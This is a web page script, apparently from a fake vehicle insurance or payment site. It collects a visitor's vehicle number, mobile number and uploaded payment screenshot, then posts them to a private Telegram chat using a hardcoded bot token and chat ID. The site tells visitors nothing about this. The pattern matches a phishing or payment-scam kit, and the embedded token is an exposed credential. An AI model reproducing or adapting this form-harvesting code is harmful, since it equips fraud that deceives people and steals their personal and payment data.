<script>

const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
const chatId="5600045707";

function toggleMenu(){
let box=document.getElementById("menuBox");
box.style.display=box.style.display==="block"?"none":"block";
}

function openInsurance(){
window.location.href="https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1";
}

function goHome(){
p1.classList.remove("hidden");
p2.classList.add("hidden");
p3.classList.add("hidden");
vehicle.value="";
mobile.value="";
proof.value="";
}

function goPay(){
if(!vehicle.value.trim()){alert("Enter vehicle number");return;}
p1.classList.add("hidden");
p2.classList.remove("hidden");
}

function submitForm(){
if(mobile.value.length<10){alert("Enter valid mobile");return;}
if(!proof.files[0]){alert("Upload screenshot");return;}

document.getElementById("loader").style.display="flex";

let data=new FormData();
data.append("chat_id",chatId);
data.append("caption",`Vehicle: ${vehicle.value}\nMobile: ${mobile.value}`);
data.append("photo",proof.files[0]);

fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
method:"POST",
body:data
})
.then(()=>{
document.getElementById("loader").style.display="none";
p2.classList.add("hidden");
p3.classList.remove("hidden");
setTimeout(()=>{goHome();},7000);
})
.catch(()=>{
document.getElementById("loader").style.display="none";
alert("Submission failed");
});
}

function formatVehicle(el){
let v=el.value.toUpperCase().replace(/[^A-Z0-9]/g,"");
let p1=v.slice(0,2);
let p2=v.slice(2,4);
let p3=v.slice(4,6);
let p4=v.slice(6,10);
let out=p1;
if(p2) out+="-"+p2;
if(p3) out+="-"+p3;
if(p4) out+="-"+p4;
el.value=out;
}

</script>
